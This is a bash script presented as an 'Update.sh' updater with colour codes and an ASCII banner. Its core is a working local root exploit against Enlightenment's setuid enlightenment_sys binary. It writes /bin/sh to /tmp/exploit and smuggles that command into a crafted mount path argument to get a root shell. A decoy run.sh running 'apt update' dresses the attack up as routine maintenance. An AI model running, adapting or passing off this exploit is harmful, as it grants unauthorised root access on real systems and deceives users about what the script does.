#!/bin/bash
echo -e "$UGreen Would you like to enter Update.sh ? $NC"
read TFY
if [ $TFY == "yes" ];
then
    Black='\033[0;30m'        # Black
    Red='\033[0;31m'          # Red
    Green='\033[0;32m'        # Green
    Yellow='\033[0;33m'       # Yellow
    Blue='\033[0;34m'         # Blue
    Purple='\033[0;35m'       # Purple
    Cyan='\033[0;36m'         # Cyan
    Wh1te='\033[0;37m'        # Wh1te
    NC='\033[0m'
    UBlue='\033[4;34m'
    UBlack='\033[4;30m'       # Black
    URed='\033[4;31m'         # Red
    UGreen='\033[4;32m'       # Green
    UYellow='\033[4;33m'      # Yellow
    UBlue='\033[4;34m'        # Blue
    UPurple='\033[4;35m'      # Purple
    UCyan='\033[4;36m'        # Cyan
    UWhite='\033[4;37m'       # White
    echo -e "[!] Entering $UPurple Update Mode.. $NC "
    sleep 1
    clear
    echo -e "$Yellow
    __/\\\________/\\\_________________________/\\\________________________________________________________________________/\\\_________        
    _\/\\\_______\/\\\________________________\/\\\_______________________________________________________________________\/\\\_________       
    _\/\\\_______\/\\\____/\\\\\\\\\__________\/\\\_______________________/\\\____________________________________________\/\\\_________      
    _\/\\\_______\/\\\___/\\\/////\\\_________\/\\\____/\\\\\\\\\______/\\\\\\\\\\\______/\\\\\\\\___________/\\\\\\\\\\__\/\\\_________     
        _\/\\\_______\/\\\__\/\\\\\\\\\\_____/\\\\\\\\\___\////////\\\____\////\\\////_____/\\\/////\\\_________\/\\\//////___\/\\\\\\\\\\__    
        _\/\\\_______\/\\\__\/\\\//////_____/\\\////\\\_____/\\\\\\\\\\______\/\\\________/\\\\\\\\\\\__________\/\\\\\\\\\\__\/\\\/////\\\_   
        _\//\\\______/\\\___\/\\\__________\/\\\__\/\\\____/\\\/////\\\______\/\\\_/\\___\//\\///////___________\////////\\\__\/\\\___\/\\\_  
        __\///\\\\\\\\\/____\/\\\__________\//\\\\\\\/\\__\//\\\\\\\\/\\_____\//\\\\\_____\//\\\\\\\\\\___/\\\___/\\\\\\\\\\__\/\\\___\/\\\_ 
            ____\/////////______\///____________\///////\//____\////////\//_______\/////_______\//////////___\///___\//////////___\///____\///__
                                            
                                            $NC"
    echo "[~] Accessing Root ..."
    (
    #!/bin/bash
    file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
    if [[ -z ${file} ]]
    then
        echo "[*] Enlightenment should be installed on your system."
        exit 1
    fi
    mkdir -p /tmp/net
    mkdir -p "/dev/../tmp/;/tmp/exploit"

    echo "/bin/sh" > /tmp/exploit
    chmod a+x /tmp/exploit
    touch run.sh
    chmod +x run.sh
    echo "apt update ; apt upgrade > /tmp/fish.txt ; sleep 3 ; rm /tmp/fish.txt " >> run.sh
    echo "[+] Enter the command './run.sh' : "
    ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
    )
else
    echo "[~] Proceeding to Alarm.sh.."
fi
